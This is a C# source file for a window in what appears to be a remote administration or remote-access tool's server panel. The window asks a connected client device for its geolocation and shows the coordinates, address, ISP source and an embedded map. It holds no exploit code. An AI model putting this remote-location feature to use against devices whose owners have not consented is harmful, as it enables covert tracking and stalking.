using System;
using System.Globalization;
using System.Linq;
using System.Windows;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class GeoWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private double _lat, _lon;
    private bool   _hasData;

    public GeoWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = clientLabel;

        _server.RegisterHandler(clientId, PacketType.GeoResult, OnResult);
        _server.ClientDisconnected += OnDisconnected;
        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();

        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.GeoResult);
            _server.ClientDisconnected -= OnDisconnected;
            Lang.LanguageChanged -= ApplyLanguage;
        };
    }

    private void ApplyLanguage()
    {
        if (!Dispatcher.CheckAccess()) { Dispatcher.BeginInvoke(ApplyLanguage); return; }
        Title                               = Lang.Get("FEAT_GEOLOCATION");
        if (TxtBtnLocate    != null) TxtBtnLocate.Text    = Lang.Get("GEO_LOCATE");
        if (TxtBtnMap       != null) TxtBtnMap.Text       = Lang.Get("GEO_OPEN_MAP");
        if (TxtIdle         != null) TxtIdle.Text         = Lang.Get("GEO_IDLE");
        if (TxtLblCoords    != null) TxtLblCoords.Text    = Lang.Get("GEO_COORDS");
        if (TxtLblSource    != null) TxtLblSource.Text    = Lang.Get("GEO_SOURCE");
        if (TxtBtnCopy      != null) TxtBtnCopy.Text      = Lang.Get("GEO_COPY");
        if (TxtBtnCopyAddr  != null) TxtBtnCopyAddr.Text  = Lang.Get("GEO_COPY");
    }

    private async void Locate_Click(object sender, RoutedEventArgs e)
    {
        BtnLocate.IsEnabled = false;
        TxtStatus.Text      = Lang.Get("GEO_LOCATING");

        PnlMapIdle.Visibility  = Visibility.Visible;
        PnlMapError.Visibility = Visibility.Collapsed;
        MapBrowser.Visibility  = Visibility.Collapsed;
        PnlData.Visibility     = Visibility.Collapsed;
        TxtIdle.Text           = Lang.Get("GEO_LOCATING");

        await _server.SendToClient(_clientId, new Packet { Type = PacketType.GeoRequest });
    }

    private void OnResult(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<GeoResultData>(pkt.Data);
        Dispatcher.BeginInvoke(() =>
        {
            BtnLocate.IsEnabled = true;

            if (data == null) { ShowError(Lang.Get("GEO_PARSE_ERR")); return; }
            if (!string.IsNullOrEmpty(data.Error)) { ShowError(data.Error); return; }

            _lat = data.Lat;
            _lon = data.Lon;
            _hasData = true;

            // Build readable address from city + region + country
            var parts = new[] { data.City, data.Region, data.Country }
                .Where(s => !string.IsNullOrWhiteSpace(s)).ToArray();
            var addr = parts.Length > 0 ? string.Join(", ", parts) : $"{data.Lat.ToString("F4", CultureInfo.InvariantCulture)}°, {data.Lon.ToString("F4", CultureInfo.InvariantCulture)}°";

            TxtAddress.Text = addr;
            TxtIspLine.Text = $"{data.Source}  •  ±{data.Accuracy:F0} m";
            TxtCoords.Text  = $"{data.Lat.ToString("F6", CultureInfo.InvariantCulture)}°,  {data.Lon.ToString("F6", CultureInfo.InvariantCulture)}°";
            TxtSource.Text  = data.Source;
            TxtRaw.Text     = pkt.Data;
            TxtStatus.Text  = addr;

            BtnCopyCoords.IsEnabled = true;
            BtnOpenMap.IsEnabled    = true;
            PnlData.Visibility      = Visibility.Visible;

            // Load embedded map
            PnlMapIdle.Visibility  = Visibility.Collapsed;
            PnlMapError.Visibility = Visibility.Collapsed;
            MapBrowser.Navigate(new Uri(
                $"https://maps.google.com/maps?q={data.Lat.ToString("G", CultureInfo.InvariantCulture)},{data.Lon.ToString("G", CultureInfo.InvariantCulture)}&z=15&output=embed"));
            MapBrowser.Visibility = Visibility.Visible;
        });
    }

    private void ShowError(string msg)
    {
        TxtMapError.Text       = msg;
        TxtStatus.Text         = msg;
        PnlMapIdle.Visibility  = Visibility.Collapsed;
        MapBrowser.Visibility  = Visibility.Collapsed;
        PnlMapError.Visibility = Visibility.Visible;
        PnlData.Visibility     = Visibility.Collapsed;
        BtnLocate.IsEnabled    = true;
        BtnOpenMap.IsEnabled   = false;
    }

    private void OpenMap_Click(object sender, RoutedEventArgs e)
    {
        if (!_hasData) return;
        try
        {
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
            {
                FileName        = $"https://www.google.com/maps?q={_lat.ToString("F6", CultureInfo.InvariantCulture)},{_lon.ToString("F6", CultureInfo.InvariantCulture)}",
                UseShellExecute = true,
            });
        }
        catch { }
    }

    private void CopyCoords_Click(object sender, RoutedEventArgs e)
    {
        if (_hasData) Clipboard.SetText($"{_lat.ToString("F6", CultureInfo.InvariantCulture)}, {_lon.ToString("F6", CultureInfo.InvariantCulture)}");
    }

    private void CopyAddr_Click(object sender, RoutedEventArgs e)
    {
        if (TxtAddress?.Text is { Length: > 0 } txt)
            Clipboard.SetText(txt);
    }

    private void OnDisconnected(SeroServer.Data.ConnectedClient c)
    {
        if (c.Id != _clientId) return;
        Dispatcher.BeginInvoke(() =>
        {
            BtnLocate.IsEnabled = true;
            TxtStatus.Text = Lang.Get("PM_DISCONNECTED");
        });
    }
}
